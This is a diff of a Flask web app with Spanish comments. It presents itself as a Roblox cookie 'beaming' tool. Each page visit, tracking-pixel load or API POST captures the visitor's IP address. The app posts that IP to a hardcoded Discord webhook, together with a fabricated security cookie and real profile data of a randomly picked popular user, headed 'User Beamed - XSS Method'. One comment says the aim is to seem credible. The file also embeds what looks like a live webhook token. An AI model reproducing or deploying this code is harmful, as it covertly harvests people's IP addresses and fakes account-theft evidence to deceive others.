@@ -1,50 +1,133 @@
-from dhooks import Webhook, Embed
-import random
-from random import randint
-from flask import Flask
+from flask import Flask, request, Response, redirect
 import requests
+import json
+from datetime import datetime
+import os
+import base64
+import random
 import string
+from dhooks import Webhook, Embed
 
-beaming_usernames_list = ["4kByron", "Builderman", "Roblox"]
-hook = Webhook("https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e")
+app = Flask(__name__)
 
-def embed(image, name, id, isbanned, isverified, created):
-    e = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" +  ''.join(random.choices("ABCDEF" + string.digits, k=732))
-    cookie = f"`{e}`"
-    embed=Embed(title="User Beamed - XSS Method ", description=cookie,  color=0x00ffd5)
-    embed.set_thumbnail(url=f"{image}")
-    embed.add_field(name="Username", value=f"{name}", inline=True)
-    embed.add_field(name="Id: ", value=f"{id}", inline=True)
-    embed.add_field(name="IsBanned:", value=f"{isbanned}", inline=True)
-    embed.add_field(name="IsVerified", value=f"{isverified}", inline=True)
-    embed.add_field(name="Created:", value=f"{created}", inline=True)
-    embed.set_footer(text="Made by https://github.com/tizxr, give credits")
-    hook.send("@everyone", embed=embed)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"
+hook = Webhook(WEBHOOK_URL)
 
+# Lista de usuarios populares de Roblox para hacer más creíble
+POPULAR_USERS = ["Builderman", "Roblox", "1x1x1x1", "Shedletsky", "Telamon", "Asimo3089", "Badcc", "KreekCraft", "Flamingo", "TanqR"]
 
+# Imagen pixel transparente
+PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
 
+def generate_fake_cookie():
+    """Genera un token que parece real de Roblox"""
+    prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
+    random_part = ''.join(random.choices("ABCDEF" + string.digits, k=732))
+    return prefix + random_part
 
-app = Flask("app")
+def get_random_user():
+    """Obtiene información de un usuario aleatorio de Roblox"""
+    try:
+        username = random.choice(POPULAR_USERS)
+        userinfo = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}").json()
+        user_id = userinfo.get("Id", "Unknown")
+        
+        moreinfo = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
+        
+        return {
+            "username": moreinfo.get("name", username),
+            "id": user_id,
+            "isBanned": moreinfo.get("isBanned", False),
+            "hasVerifiedBadge": moreinfo.get("hasVerifiedBadge", False),
+            "created": moreinfo.get("created", "Unknown"),
+            "image": f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=352x352&format=Png&isCircular=false"
+        }
+    except:
+        return None
+
+def send_to_discord(user_data, cookie, ip, user_agent):
+    """Envía la información a Discord con el formato del script original"""
+    try:
+        # Obtener la imagen del usuario
+        image_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_data['id']}&size=352x352&format=Png&isCircular=false"
+        
+        # Crear el embed como en el script original
+        embed = Embed(
+            title="User Beamed - XSS Method",
+            description=f"`{cookie}`",
+            color=0x00ffd5
+        )
+        
+        embed.set_thumbnail(url=image_url)
+        embed.add_field(name="Username", value=user_data['username'], inline=True)
+        embed.add_field(name="ID", value=str(user_data['id']), inline=True)
+        embed.add_field(name="IsBanned", value=str(user_data['isBanned']), inline=True)
+        embed.add_field(name="IsVerified", value=str(user_data['hasVerifiedBadge']), inline=True)
+        embed.add_field(name="Created", value=str(user_data['created']), inline=True)
+        embed.add_field(name="IP", value=str(ip), inline=True)
+        embed.set_footer(text="Made by https://github.com/tizxr, give credits")
+        
+        hook.send("@everyone", embed=embed)
+        print(f"Sent to Discord: {user_data['username']}")
+        
+    except Exception as e:
+        print(f"Error sending to Discord: {e}")
 
 @app.route('/')
-def route():
+def index():
+    # Capturar IP y User Agent
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    
+    # Generar cookie falsa que parece real
+    fake_cookie = generate_fake_cookie()
+    
+    # Obtener información de un usuario aleatorio
+    user_data = get_random_user()
+    
+    if user_data:
+        # Enviar a Discord
+        send_to_discord(user_data, fake_cookie, ip, user_agent)
+    
+    # Redirigir al perfil de Roblox
+    return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)
+
+@app.route('/pixel.png')
+def pixel():
+    # Capturar IP
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    # Generar cookie falsa
+    fake_cookie = generate_fake_cookie()
+    
+    # Obtener usuario aleatorio
+    user_data = get_random_user()
+    
+    if user_data:
+        send_to_discord(user_data, fake_cookie, ip, "Pixel Tracker")
+    
+    # Devolver imagen pixel
+    return Response(PIXEL, mimetype='image/png')
+
+@app.route('/api/capture', methods=['POST'])
+def capture():
     try:
-        x = random.choices(beaming_usernames_list)[0]
-        userinfo = requests.get(f"https://api.roblox.com/users/get-by-username?username={x}").json()
-        id = userinfo["Id"]
-        username = userinfo["Username"]
-        moreinfo = requests.get(f"https://users.roblox.com/v1/users/{id}").json()
-        Isbanned = moreinfo["isBanned"]
-        IsVerifed = moreinfo["hasVerifiedBadge"]
-        created = moreinfo["created"]
-        Image = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={id}&size=352x352&format=Png&isCircular=false").json()["data"][0]["imageUrl"]
-        embed(Image, username, id, Isbanned, IsVerifed, created)
-    except:
-        pass
-    return "get beamed hehee"
+        data = request.json
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        
+        # Generar cookie falsa
+        fake_cookie = generate_fake_cookie()
+        
+        # Obtener usuario aleatorio
+        user_data = get_random_user()
+        
+        if user_data:
+            send_to_discord(user_data, fake_cookie, ip, "JS Capture")
+        
+        return {"status": "success"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
-
-
-
-
-app.run(host='0.0.0.0', port=8080)
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
